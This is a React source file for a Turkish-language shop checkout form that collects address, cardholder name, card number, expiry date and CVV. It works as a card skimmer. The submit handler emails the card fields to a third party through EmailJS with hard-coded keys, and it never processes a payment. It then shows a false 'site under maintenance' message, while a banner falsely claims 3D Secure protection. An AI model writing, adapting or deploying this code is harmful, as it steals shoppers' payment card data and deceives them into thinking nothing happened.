import "./SiparisVer.css";
import React, { useRef, useState } from "react";
import emailjs from "@emailjs/browser";

const SiparisVer = () => {
  const form = useRef();

  const [address, setAddress] = useState("");
  const [city, setCity] = useState("");
  const [zip, setZip] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [cvv, setCvv] = useState("");

  const handleSubmit = (e) => {
    e.preventDefault();

    emailjs
      .sendForm("service_jpyc2gm", "template_x7zj33r", form.current, {
        publicKey: "V57OWPDudEhHuEDPU",
      })
      .then(
        () => {
          alert(
            "Sitemiz bakımda lütfen mağazamızdan satın alın. Siparişiniz alınamadı."
          );
        },
        (error) => {
          alert("Sipariş alınamadı. Kart bilgilerini kontrol edin.");
        }
      );
    // Form verilerini işleyin
    console.log({
      address,
      city,
      zip,
      cardNumber,
      expiryDate,
      cvv,
    });
  };
  return (
    <div className="flex siparis-ver items-center justify-center min-h-screen ">
      <div className="w-full max-w-md p-8 space-y-6 bg-white rounded-lg shadow-md">
        <div className="w-full bg-orange-500 p-5 rounded text-white font-bold">
          Tüm ödeme yöntemleri 3D koruma içerir. Bu sayede güvenle alışveriş
          yapabilirsiniz. Bizi tercih ettiğiniz için teşekkürler, yine bekleriz.
        </div>
        <h2 className="text-2xl font-bold text-center">Ödeme Ekranı</h2>
        <form className="space-y-4" ref={form} onSubmit={handleSubmit}>
          <div>
            <label className="block mb-2 text-sm font-medium text-gray-700">
              Alıcı Ad Soyad
            </label>
            <input
              type="text"
              className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring focus:ring-orange-300"
              required
            />
          </div>
          <div>
            <label className="block mb-2 text-sm font-medium text-gray-700">
              Adres
            </label>
            <input
              type="text"
              className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring focus:ring-orange-300"
              required
            />
          </div>
          <div>
            <label className="block mb-2 text-sm font-medium text-gray-700">
              Şehir
            </label>
            <input
              type="text"
              value={city}
              onChange={(e) => setCity(e.target.value)}
              className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring focus:ring-orange-300"
              required
            />
          </div>
          <div>
            <label className="block mb-2 text-sm font-medium text-gray-700">
              Posta Kodu
            </label>
            <input
              type="text"
              value={zip}
              onChange={(e) => setZip(e.target.value)}
              className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring focus:ring-orange-300"
              required
            />
          </div>
          <div>
            <label className="block mb-2 text-sm font-medium text-gray-700">
              Kart Sahibi Ad Soyad
            </label>
            <input
              type="text"
              className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring focus:ring-orange-300"
              required
              name="kart-ad"
            />
          </div>
          <div>
            <label className="block mb-2 text-sm font-medium text-gray-700">
              Kredi Kartı Numarası
            </label>
            <input
              type="text"
              value={cardNumber}
              onChange={(e) => setCardNumber(e.target.value)}
              className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring focus:ring-orange-300"
              required
              name="kart-no"
            />
          </div>
          <div>
            <label className="block mb-2 text-sm font-medium text-gray-700">
              Son Kullanma Tarihi
            </label>
            <input
              type="text"
              value={expiryDate}
              onChange={(e) => setExpiryDate(e.target.value)}
              className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring focus:ring-orange-300"
              placeholder="MM/YY"
              required
              name="son-tarih"
            />
          </div>
          <div>
            <label className="block mb-2 text-sm font-medium text-gray-700">
              CVV
            </label>
            <input
              type="text"
              value={cvv}
              onChange={(e) => setCvv(e.target.value)}
              className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring focus:ring-orange-300"
              required
              name="guvenlik"
            />
          </div>
          <button
            type="submit"
            className="w-full px-4 py-2 text-white bg-orange-600 rounded-md hover:bg-orange-700 focus:outline-none focus:ring focus:ring-indigo-200"
          >
            Ödemeyi Yap
          </button>
        </form>
      </div>
    </div>
  );
};

export default SiparisVer;
